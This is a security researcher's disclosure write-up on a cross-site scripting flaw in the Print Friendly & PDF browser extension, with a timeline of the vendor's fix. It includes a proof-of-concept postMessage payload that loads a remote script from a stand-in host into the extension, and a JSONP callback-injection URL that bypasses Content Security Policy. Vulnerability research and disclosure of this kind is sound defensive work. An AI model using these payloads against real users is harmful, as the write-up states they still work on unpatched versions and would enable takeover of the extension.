---
categories:
- security
- add-ons
date: 2021-04-13T12:41:35+0200
description: Any website could completely compromise Print Friendly & PDF browser
  extension. The fix is not very convincing.
lastmod: '2026-02-09 03:42:45'
title: 'Print Friendly & PDF: Full compromise'
---

I looked into the Print Friendly & PDF browser extension while helping someone figure out an issue they were having. The issue turned out unrelated to the extension, but I already noticed something that looked very odd. A quick investigation later I could confirm a massive vulnerability affecting all of its users (close to 1 million of them). Any website could easily gain complete control of the extension.

{{< img src="print_friendly.png" alt="Print Friendly & PDF in Chrome Web Store: 800,000+ users" width="600" />}}

This particular issue has been resolved in Print Friendly & PDF 2.7.39 for Chrome. The underlying issues have not been addressed however, and the extension is still riddled with insecure coding practices. Hence my recommendation is still to uninstall it. Also, the Firefox variant of the extension (version 1.3) is still affected. I did not look at the Microsoft Edge variant but it hasn’t been updated recently and might also be vulnerable.

*Note*: To make the confusion complete, there is a browser extension called Print Friendly & PDF 2.1.0 on the Firefox Add-ons website. This one has no functionality beyond redirecting the user to `printfriendly.com` and isn’t affected. The problematic Firefox extension is being distributed from the vendor’s website directly.

{{< toc >}}

## Summary of the findings

As of version 2.7.33 for Chrome and 1.3 for Firefox, Print Friendly & PDF marked two pages (`algo.html` and `core.html`) as web-accessible, meaning that any web page could load them. The initialization routine for these pages involved receiving a `message` event, something that a website could easily send as well. Part of the message data were scripts that would then be loaded in extension context. While normally [Content Security Policy](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_Security_Policy) would prevent exploitation of this [Cross-Site Scripting vulnerability](https://en.wikipedia.org/wiki/Cross-site_scripting), here this protection was relaxed to the point of being easily circumvented. So any web page could execute arbitrary JavaScript code in the context of the extension, gaining any privileges that the extension had.

The only factor slightly alleviating this vulnerability was the fact that the extension did not request too many privileges:

{{< highlight json >}}
"permissions": [ "activeTab", "contextMenus" ],
{{< /highlight >}}

So any code running in the extension context could “merely”:

* Persist until a browser restart, even if the website it originated from is closed
* Open new tabs and browser windows at any time
* Watch the user opening and closing tabs as well as navigating to pages, but without access to page addresses or titles
* Arbitrarily manipulate the extension’s icon and context menu item
* Gain full access to the current browser tab whenever this icon or context menu item was clicked

## Insecure communication

When the Print Friendly & PDF extension icon is clicked, the extension first injects a content script into the current tab. This content script then adds a frame pointing to the extension’s `core.html` page. This requires `core.html` to be web-accessible, so any website can load that page as well (here assuming Chrome browser):

{{< highlight html >}}
<iframe src="chrome-extension://ohlencieiipommannpdfcmfdpjjmeolj/core.html"></iframe>
{{< /highlight >}}

Next the content script needs the frame to initialize. And so it takes a shortcut by using [window.postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) and sending a message to the frame. While being convenient, this API is also rarely used securely in a browser extension (see [Chromium issue](https://bugs.chromium.org/p/chromium/issues/detail?id=1188556) I filed). Here is what the receiving end looks like in this case:

{{< highlight js >}}
window.addEventListener('message', function(event) {
  if (event.data) {
    if (event.data.type === 'PfLoadCore' && !pfLoadCoreCalled) {
      pfLoadCoreCalled = true;
      var payload = event.data.payload;
      var pfData = payload.pfData;
      var urls = pfData.config.urls;

      helper.loadScript(urls.js.jquery);
      helper.loadScript(urls.js.raven);
      helper.loadScript(urls.js.core, function() {
        window.postMessage({type: 'PfStartCore', payload: payload}, '*');
      });
      helper.loadCss(urls.css.pfApp, 'screen');
    }
  }
});
{{< /highlight >}}

No checks performed here, any website can send a message like that. And `helper.loadScript()` does exactly what you would expect: it adds a `<script>` tag to the current (privileged) extension script and attempts to load whatever script it was given.

So any web page that loaded this frame can do the following:

{{< highlight js >}}
var url = "https://example.com/xss.js";
frame.contentWindow.postMessage({
  type: "PfLoadCore",
  payload: {
    pfData: {
      config: {
        urls: {
          js: {
            jquery: url
          }
        }
      }
    }
  }
}, "*")
{{< /highlight >}}

And the page will attempt to load this script, in the extension context.

## Getting around Content Security Policy

With most web pages, this would be the point where attackers could run arbitrary JavaScript code. Browser extensions are always protected by [Content Security Policy](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_Security_Policy) however. The default `strict-src 'self'` policy makes exploiting Cross-Site Scripting vulnerabilities difficult (but [not impossible](/2020/02/25/mcafee-webadvisor-from-xss-in-a-sandboxed-browser-extension-to-administrator-privileges/)).

But Print Friendly & PDF does not stick to the default policy. Instead, what they have is the following:

{{< highlight json >}}
"content_security_policy": "script-src 'self'
    https://cdn.printfriendly.com
    https://www.printfriendly.com
    https://v.printfriendly.com
    https://key-cdn.printfriendly.com
    https://ds-4047.kxcdn.com
    https://www.google-analytics.com
    https://platform.twitter.com
    https://api.twitter.com
    https://cdnjs.cloudflare.com
    https://cdn.ravenjs.com",
{{< /highlight >}}

Yes, that’s a very long list of web servers that JavaScript code can come from. In particular, the CDN servers host all kinds of JavaScript libraries. But one doesn’t really have to go there. Elsewhere in the extension code one can see:

{{< highlight js >}}
var script = document.createElement("script");
script.src = this.config.hosts.ds_cdn +
    "/api/v3/domain_settings/a?callback=pfMod.saveAdSettings&hostname=" +
    this.config.hosts.page + "&client_version=" + hokil.version;
{{< /highlight >}}

See that `callback` parameter? That’s [JSONP](https://en.wikipedia.org/wiki/JSONP), the crutch web developers used for cross-domain data retrieval before [Cross-Origin Resource Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) was widely available. It’s essentially Cross-Site Scripting but intentionally. And the `callback` parameter becomes part of the script.

Nowadays JSONP endpoints which are kept around for legacy reasons will usually only allow certain characters in the callback name. Not so in this case. Loading `https://www.printfriendly.com/api/v3/domain_settings/a?callback=alert(location.href)//&hostname=example.com` will result in the following script:

{{< highlight js >}}
/**/alert(location.href)//(...)
{{< /highlight >}}

So here we can inject any code into a script that is located on the `www.printfriendly.com` domain. If we ask the extension to load this one, Content Security Policy will no longer prevent it. Done, injection of arbitrary code into the extension context, full compromise.

## What’s fixed and what isn’t

More than two months after reporting this issue I checked in on the progress. I discovered that, despite several releases, the current extension version was still vulnerable. So I sent a reminder to the vendor, warning them about the disclosure deadline getting close. The response was reassuring:

> We are working on it.  [...] We will be finishing the update before the deadline.

When I finally looked at the fix before this publication, I noticed that it merely removed the problematic message exchange. The communication now went via the extension’s background page as it should. That’s it.

While this prevents exploitation of the issue as outlined here, all other problematic choices remain intact. In particular, the extension continues to relax Content Security Policy protection. Given how this extension works, my recommendation was hosting the `core.html` frame completely remotely. This has not been implemented.

No callback name validation has been added to the JSONP endpoints on `www.printfriendly.com` (there are multiple), so Content Security Policy integrity hasn’t been ensured this way either.

Not just that, the extension continues to use JSONP for some functionality, even in privileged contexts. The JavaScript code executed here comes not merely from `www.printfriendly.com` but also from `api.twitter.com` for example. For reference: there is absolutely no valid reason for a browser extension to use JSONP.

And while the insecure message exchange has been removed, some of the extension’s interactions with web pages remain highly problematic.

## Timeline

* 2021-01-13: Reported the vulnerability to the vendor
* 2021-01-13: Received confirmation that the issue is being looked at
* 2021-03-21: Reminded the vendor of the disclosure deadline
* 2021-03-22: Received confirmation that the issue will be fixed in time
* 2021-04-07: Received notification about the issue being resolved
* 2021-04-12: Notified the vendor about outstanding problems and lack of a Firefox release